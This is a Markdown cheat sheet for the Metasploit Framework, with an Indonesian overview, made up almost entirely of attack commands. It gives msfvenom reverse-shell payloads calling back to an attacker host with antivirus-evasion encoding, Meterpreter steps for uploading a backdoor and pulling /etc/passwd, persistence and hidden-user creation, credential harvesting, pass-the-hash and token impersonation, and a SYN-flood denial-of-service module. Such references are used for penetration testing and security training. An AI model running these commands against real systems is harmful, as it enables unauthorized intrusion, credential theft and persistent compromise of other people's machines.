# ⚔️ Metasploit Framework

## 📋 Overview
Metasploit adalah framework untuk developing dan executing exploit code terhadap target machine.

## 🚀 Basic Usage

### Starting Metasploit
```bash
# Start msfconsole
msfconsole

# Start with specific database
msfconsole -d penetration_test

# Quiet mode
msfconsole -q
```

### Basic Commands
```bash
# Help
help

# Search exploits
search type:exploit platform:linux

# Show exploit info
info exploit/linux/http/apache_mod_cgi_bash_env_exec

# Use exploit
use exploit/linux/http/apache_mod_cgi_bash_env_exec

# Show options
show options

# Set options
set RHOSTS 192.168.1.100
set RPORT 80

# Show payloads
show payloads

# Set payload
set payload linux/x86/shell/reverse_tcp

# Run exploit
exploit
run
```

## 🎯 Main Components

### Exploits
```bash
# Search exploits
search name:eternal
search platform:windows type:exploit
search cve:2017

# Categories
search type:auxiliary
search type:post
search type:encoder
```

### Payloads
```bash
# Show compatible payloads
show payloads

# Payload types
# Singles - self-contained
# Stagers - small payload that downloads larger
# Stages - payload components downloaded by stager

# Common payloads
set payload windows/meterpreter/reverse_tcp
set payload linux/x86/shell/reverse_tcp
set payload php/meterpreter/reverse_tcp
```

### Auxiliary Modules
```bash
# Scanners
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/dir_scanner

# Fuzzers
use auxiliary/fuzzers/http/http_form_field

# Denial of Service
use auxiliary/dos/tcp/synflood
```

## 🔥 Meterpreter Commands

### System Information
```bash
# System info
sysinfo
getuid
getpid

# Process list
ps

# Environment variables
getenv
```

### File System
```bash
# Current directory
pwd

# List files
ls
dir

# Change directory
cd /tmp

# Download file
download /etc/passwd /tmp/passwd

# Upload file
upload /tmp/backdoor.exe C:\\Windows\\backdoor.exe

# Search files
search -f *.txt
```

### Network
```bash
# Network interfaces
ifconfig
ipconfig

# ARP table
arp

# Routing table
route

# Port forwarding
portfwd add -l 1234 -p 3389 -r 192.168.1.100
```

### Privilege Escalation
```bash
# Get system (Windows)
getsystem

# Steal token
steal_token 1234

# Load modules
load priv
load incognito

# Enumerate privileges
enum_privs
```

### Persistence
```bash
# Install service (Windows)
run persistence -S -U -X -i 10 -p 4444 -r 192.168.1.200

# Add user
run getgui -u hacker -p password123

# Enable RDP
run getgui -e
```

## 🛠️ Msfvenom (Payload Generator)

### Basic Syntax
```bash
msfvenom -p <payload> -f <format> -o <output_file>
```

### Common Payloads
```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f elf -o shell

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o shell.jsp

# WAR reverse shell
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f war -o shell.war
```

### Encoding & Evasion
```bash
# Encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_shell.exe

# Multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -e x86/shikata_ga_nai -e x86/countdown -i 3 -f exe -o multi_encoded_shell.exe
```

## 🎯 Database Commands

### Workspace Management
```bash
# List workspaces
workspace

# Create workspace
workspace -a pentest_lab

# Switch workspace
workspace pentest_lab

# Delete workspace
workspace -d old_pentest
```

### Host & Service Management
```bash
# Add host
hosts -a 192.168.1.100

# List hosts
hosts

# Add service
services -a -p 80 -s http 192.168.1.100

# List services
services

# Import nmap scan
db_import /tmp/nmap_scan.xml
```

## 🔧 Resource Scripts
```bash
# Create resource script
echo "use exploit/multi/handler" > handler.rc
echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST 192.168.1.200" >> handler.rc
echo "set LPORT 4444" >> handler.rc
echo "exploit -j" >> handler.rc

# Run resource script
resource handler.rc
```

## ⚠️ Post-Exploitation

### Information Gathering
```bash
# System enumeration
run post/windows/gather/enum_system
run post/linux/gather/enum_system

# Credential harvesting
run post/windows/gather/credentials/credential_collector
run post/windows/gather/smart_hashdump

# Network enumeration
run post/windows/gather/enum_domain
run post/multi/gather/ping_sweep
```

### Lateral Movement
```bash
# Pass the hash
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Token impersonation
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```

## 📚 Pro Tips
1. Always update Metasploit: `msfupdate`
2. Use workspaces to organize different engagements
3. Save sessions: `sessions -i 1 -s session.txt`
4. Background sessions: `background`
5. Use `info` command extensively to understand modules

## 🔗 References
- [Official Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Meterpreter Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
